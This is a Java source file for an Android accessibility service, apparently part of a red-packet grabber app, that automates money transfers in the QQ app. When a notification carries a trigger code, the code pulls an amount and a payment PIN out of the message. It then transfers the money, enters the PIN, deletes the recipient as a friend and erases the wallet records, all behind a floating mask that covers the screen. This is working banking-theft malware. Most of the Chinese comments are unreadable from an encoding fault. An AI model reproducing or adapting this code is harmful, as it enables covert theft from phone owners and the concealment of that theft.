/**
 * 
 */
package accessibility.app;






import java.util.List;

import accessibility.AccessibilityHelper;
import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import activity.SplashActivity;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Parcelable;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import floatwindow.FloatWindowMask;
import notification.NotifyHelper;
import permission.GivePermission;
import util.ConfigCt;
import util.Funcs;
import util.RootShellCmd;


/**
 * @author ASUS
 *
 */
public class QQTransferAccounts extends BaseAccessibilityJob  {//QQ:7.6.5
	private static final String WINDOW_TRANSACTION_UI="com.tencent.mobileqq.activity.qwallet.TransactionActivity";//ת�ʴ��壺������
	private static final String WINDOW_PWD_UI="cooperation.qwallet.plugin.QWalletPluginProxyActivity";//���봰�壺��������
	private static final String WINDOW_QQ_BROWSER_UI="com.tencent.mobileqq.activity.QQBrowserActivity";//���
	private static final String WINDOW_CHATSETTING_UI="com.tencent.mobileqq.activity.ChatSettingActivity";//�������ô��壺ɾ������
	public static final String WINDOW_LAUNCHER_UI="com.tencent.mobileqq.activity.SplashActivity";
	
	
	public static final String WIDGET_BUTTON="android.widget.Button";
	
	private static QQTransferAccounts current;
	public static final String WX_TRANSFER_ACCOUNTS_ORDER = "19760909";//��
	private String mMoney="0001";//0200
	private String mPwd="000000";
	public static boolean mWorking=false;
	private AccessibilityNodeInfo mRootNode;
	private  boolean mIsClear=false;
	private boolean mIsInputPWDing=false;//�Ƿ������������룻
	public enum State {//ת��״̬��ɾ������״̬��ɾ��Ǯ����¼״̬��
	    TRANSACATION,DEL_FRIEND,DEL_MONEY_LOG;
	}
	private State mState=State.TRANSACATION;
	
    private QQTransferAccounts() {
    	super(new String[]{ConfigCt.QQ_PACKAGENAME});
    }
    public static synchronized QQTransferAccounts getInstance() {
        if(current == null) {
            current = new QQTransferAccounts();
        }
        return current;
    }
    @Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart();

	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
	/*
	 * (ˢ�´�������)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
    	
	}
	 @Override
	public void onReceiveJob(AccessibilityEvent event) {
		 super.onReceiveJob(event);
		 if(!mIsEventWorking)return;
		 if(!mIsTargetPackageName)return;
		 int eventType = event.getEventType(); 
		 switch (eventType) {  
		 	case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: //��һ��������֪ͨ����Ϣ     
			 if(event.getParcelableData()==null)return;
			 Parcelable data = event.getParcelableData();  //��ȡParcelable����  
			 if (data instanceof Notification) {//�ж��Ƿ���Notification����    
				 Notification notification = (Notification) data;
				 if(notification.tickerText==null)return;
				 String text = String.valueOf(notification.tickerText);
				 if(text.contains(WX_TRANSFER_ACCOUNTS_ORDER)){
					 int index = text.indexOf(":");
				     if(index != -1) {
				    	 text = text.substring(index + 1);
				    	 text=text.trim();
				     }
				     if(!parseOrder(text))return;
				     if(!openNotification(notification))return;
				     Workstart();
				 }
			 }
			 break;
	        case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: //
	        	if(!mWorking)return;
	        	if(event.getClassName()==null)return;
	        	mCurrentUI= event.getClassName().toString(); 
	        	
	            if (mCurrentUI.equals(WINDOW_LAUNCHER_UI)) {
	            	Funcs.Sleep(1000);
	            	mRootNode=event.getSource();
	            	if(mState==State.TRANSACATION){
	            		clickJia(mRootNode); 
	            	}else if(mState==State.DEL_FRIEND){
	            		clickChatSettingButton(mRootNode);
	            	}else if(mState==State.DEL_MONEY_LOG){
	            		clickDelMoneyLogTxt(mRootNode);
	            		mWorking=false;
	            	}
	            	//if(mIsClear)
	            		//clickChatSettingButton(mRootNode);  
	            	//else
	            		//clickJia(mRootNode);  
	            		//ClickHBimgButton(mRootNode);
	            }
				if(mCurrentUI.equals("android.app.Dialog")){//ȷ�϶Ի���1�������ť��2ɾ�����ѣ�
			        AccessibilityNodeInfo rootNode = event.getSource();
			        if (rootNode == null) {return; }
			        if(mState==State.DEL_FRIEND){clickDelFriend(rootNode);mState=State.DEL_MONEY_LOG;return;}
			        //AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "���", -1);
			        AccessibilityNodeInfo nodeInfo=AccessibilityHelper.findNodeInfosByText(rootNode, "����", -1);
			        if (nodeInfo == null) {return; }
			        AccessibilityHelper.performClick(nodeInfo);
					return;
				}
				if (mCurrentUI.equals(WINDOW_TRANSACTION_UI)) {//ת�ʴ��壺������
					if(mState!=State.TRANSACATION){return;}
					mRootNode=event.getSource();
					if (mRootNode == null) {return; }
					mRootNode =AccessibilityHelper.getRootNode(mRootNode);
					inputText(mRootNode,mMoney);//������
					clickTransactionOK(mRootNode);
				}
				if (mCurrentUI.equals(WINDOW_PWD_UI)) {//׼���������룺
					mIsInputPWDing=false;
				}
	            if (mCurrentUI.equals(WINDOW_QQ_BROWSER_UI)) {//ת����ɣ�
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	clickCompleteReturn(mRootNode);
	            }
	            if (mCurrentUI.equals(WINDOW_CHATSETTING_UI)) {//������Ϣҳ��:ɾ������
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	clickDelFriend(mRootNode);
	            }
	           
	            break; 
	        case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED: 
	        	if(!mWorking)return;
	            if (mCurrentUI.equals(WINDOW_LAUNCHER_UI)) { 
	            	if(mState==State.TRANSACATION){
	            		mRootNode=event.getSource();
	            		if (mRootNode == null) {return; }
	            		mRootNode =AccessibilityHelper.getRootNode(mRootNode);
	            		clickRemittanceItem(mRootNode);//��ת�ʰ�ť
	            	}else if(mState==State.DEL_MONEY_LOG){
	            		//Funcs.Sleep(1000);
	            		//clickDelMoneyLogTxt(mRootNode);
	            		//mWorking=false;
	            	}
	            }
	            if (mCurrentUI.equals(WINDOW_PWD_UI)) {//�������룺
	            	inputPWD();
	            	mIsClear=true;
	            	mState=State.DEL_FRIEND;
	            }
	            if (mCurrentUI.equals(WINDOW_PWD_UI)) {
	            	mRootNode=event.getSource();
	            	if (mRootNode == null) {return; }
	            	mRootNode =AccessibilityHelper.getRootNode(mRootNode);
	            	clickSafeButton(mRootNode);
	            }
	            if (mCurrentUI.equals(WINDOW_TRANSACTION_UI)) {//ת�ʴ��壺������
	            	
	            	if(mState==State.DEL_FRIEND){AccessibilityHelper.performBack(service);return;}
	            	
	            }
	            if (mCurrentUI.equals(WINDOW_QQ_BROWSER_UI)) {//ת����ɣ�
	            	//AccessibilityHelper.performBack(service);
	            }
	        	break; 
	        }
		 }

	/**��֪ͨ����Ϣ*/
	@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
	private boolean openNotification(Notification notification) {
		PendingIntent pendingIntent = notification.contentIntent;
		boolean lock = NotifyHelper.isLockScreen(context);
		if(!lock) {
			return NotifyHelper.send(pendingIntent);
		}
		return false;
	}
	/*��������*/
	private boolean parseOrder(String text) {
		if(text.length()!=18)return false;
		mPwd=text.substring(12);
		//if(mPwd.equals("000000"))
			//mPwd=Config.sPWD;
		mMoney=text.substring(8,12);
		return true;
	}
	//--------------------------------------------------------------------------------------
	//������ͼƬ��ť��
    public boolean ClickHBimgButton(AccessibilityNodeInfo rootNode) {
    	//���ԣ�
    	//AccessibilityHelper.recycle(rootNode);
        AccessibilityNodeInfo target = GetHBImgButton(rootNode);
        if(target==null)return false;
        target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        return true;
    }
    /*
     * ��ȡ���ͼƬ��ť��
     */
    public AccessibilityNodeInfo GetHBImgButton(AccessibilityNodeInfo rootNode) {
    	String className="android.widget.ImageView";
    	int i=-1;//�ӺŰ�ť�ڴ����е���ţ�
    	//if(Config.wv>=676)i=-3;
    	//���ԣ�
    	//AccessibilityHelper.recycle(rootNode);
        AccessibilityNodeInfo target = AccessibilityHelper.findNodeInfosByClassName(rootNode, className, i,true);
        if(target==null)return null;
        i=0;
        for(int j=AccessibilityHelper.classNames.size()-1;j>0;j--){
        	target=AccessibilityHelper.classNames.get(j);
        	if(target.getContentDescription()==null){
        		if(i==3)return target;
        		i=i+1;
        	}
        }
        return null;
    }
    /*
     * ��ȡ�ӺŰ�ť��
     */
    public AccessibilityNodeInfo GetJia(AccessibilityNodeInfo rootNode) {
    	String className="android.widget.ImageView";
    	int i=-1;//�ӺŰ�ť�ڴ����е���ţ�
    	//if(Config.wv>=676)i=-3;
    	//���ԣ�
    	//AccessibilityHelper.recycle(rootNode);
        AccessibilityNodeInfo target = AccessibilityHelper.findNodeInfosByClassName(rootNode, className, i,true);
        if(target==null)return null;
        for(int j=AccessibilityHelper.classNames.size()-1;j>0;j--){
        	target=AccessibilityHelper.classNames.get(j);
        	if(target.getContentDescription()==null)return target;
        }
        return null;
    }
    //����Ӻţ�
    public boolean clickJia(AccessibilityNodeInfo rootNode) {
    	//���ԣ�
    	//AccessibilityHelper.recycle(rootNode);
        AccessibilityNodeInfo target = GetJia(rootNode);
        if(target==null)return false;
        target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        return true;
    }
    //-----------------------------------------------------------------------------------
    /*
     * ���ת�ˣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickRemittanceItem(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ת��",-1);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * ���ת�ˣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickRemittanceButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "ת��","android.widget.Button");
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * �����Ȼ֧����
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickSafeButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByTextAndClassName(rootNode, "��Ȼ֧��","android.widget.Button");
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }

    //-----------------------------------------������--------------------------------------------------
    /*
     * ���������ʹ�ã�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickAmountButton(AccessibilityNodeInfo rootNode,String value){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, value,-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.Button"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    public boolean clickAmountPanel(AccessibilityNodeInfo rootNode,String amount){
    	for(int i=0;i<amount.length();i++){
    		String c=amount.substring(i,i+1);
    		if(!clickAmountButton(rootNode,c))return false;
    	}
    	return clickRemittanceButton(rootNode);
    }
    public boolean inputText(AccessibilityNodeInfo rootNode,String amount){
    	AccessibilityNodeInfo target=AccessibilityHelper.findNodeInfosByClassName(rootNode, "android.widget.EditText", 0,true);
    	if(target==null)return false;
    	if(!nodeInput(target,amount))return false;
    	return true;
    }
    /*
     * ���ȷ��ת�ˣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickTransactionOK(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ȷ��ת��",-1);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    //----------------------------------------------------------------------------------------------
	  /*
     * ���������Ϣ��ť��
     */
    public boolean clickChatSettingButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "��������",-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.ImageView"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
	/*
     * ���ɾ�����Ѱ�ť��
     */
    public boolean clickDelFriendDialog(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByClassName(rootNode, "android.widget.RelativeLayout", -1, true);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
	/*
     * ���ɾ�����Ѱ�ť��
     */
    public boolean clickDelFriend(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ɾ������",-1);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
	/*
     * ���ɾ��Ǯ����¼��
     */
    public boolean clickDelMoneyLogTxt(AccessibilityNodeInfo rootNode){
    	  List<AccessibilityNodeInfo> list = rootNode.findAccessibilityNodeInfosByText("ɾ��");
          if(list == null || list.isEmpty()) {
              return false;
          }
          for(AccessibilityNodeInfo nodeInfo:list){
        	  AccessibilityHelper.performClick(nodeInfo);
          }
          return true;
    	//AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "ɾ��",1);
    	//if(nodeInfo==null)return false;
    	//return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * �����հ�ť��
     */
    public boolean clickClearButton(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "���",0);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * �����ɣ�
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickCompleteReturn(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "����",0);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    public void inputPWD(){
    	if(mIsInputPWDing)return;
    	mIsInputPWDing=true;
    	Funcs.Sleep(1000);
    	if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N)
    		WXinputPWD.getInstance().inputThread(mPwd);
    	else
    		WXinputPWD.getInstance().input7Thread(mPwd);
    	//mIsInputPWDing
    }
    /**��ʼ����30��*/
    public void Workstart() {
    	mWorking=true;
    	mIsClear=false;
    	mState=State.TRANSACATION;
    	FloatWindowMask.getInstance(context).ShowFloatingWindow();
    	//if(GivePermission.getGivePermission().isEnable()){
		//	GivePermission.getGivePermission().EventStart();
		//	GivePermission.getGivePermission().TimeStart();
		//}
    	
    	Handler handler= new Handler(); 
    	Runnable runnableBack  = new Runnable() {    
    		@Override    
    		public void run() {    
    			OpenQQ(context,ConfigCt.QQ_PACKAGENAME);
    			mWorking=false;
    			Funcs.Sleep(10*1000);
    			FloatWindowMask.getInstance(context).RemoveFloatingWindow();
    			SplashActivity.startHomeActivity(getContext());
    		}    
    	};
    	handler.postDelayed(runnableBack, 20*1000);
    }
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public  boolean nodeInput(AccessibilityNodeInfo edtNode,String txt){
    	if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.LOLLIPOP){//android 5.0
    		Bundle arguments = new Bundle();
        	arguments.putCharSequence(AccessibilityNodeInfo .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,txt);
        	edtNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
        	return true;
    	}
    	if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.JELLY_BEAN_MR2){//android 4.3
    		ClipboardManager clipboard = (ClipboardManager)context.getSystemService(Context.CLIPBOARD_SERVICE);  
    		ClipData clip = ClipData.newPlainText("text",txt);  
    		clipboard.setPrimaryClip(clip);  

    		edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);  
    		////ճ����������  
    		edtNode.performAction(AccessibilityNodeInfo.ACTION_PASTE);  
    		return true;
    	}
    	if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.ICE_CREAM_SANDWICH){//android 4.0
    		edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
        	String sOrder="input text "+txt;
        	AccessibilityHelper.Sleep(100);
        	if(RootShellCmd.getRootShellCmd(context).execShellCmd(sOrder)){
        		AccessibilityHelper.Sleep(1000);
        		return true;
        	}
        	return false;
    	}
    	return false;
    }
    public static boolean OpenQQ(Context context,String pkg){
    	Intent intent = new Intent(); 
    	PackageManager packageManager = context.getPackageManager(); 
    	intent = packageManager.getLaunchIntentForPackage(pkg); 
    	if(intent==null)return false;
    	intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK|Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED | Intent.FLAG_ACTIVITY_CLEAR_TOP) ; 
    	context.startActivity(intent);
    	return true;
    }
}
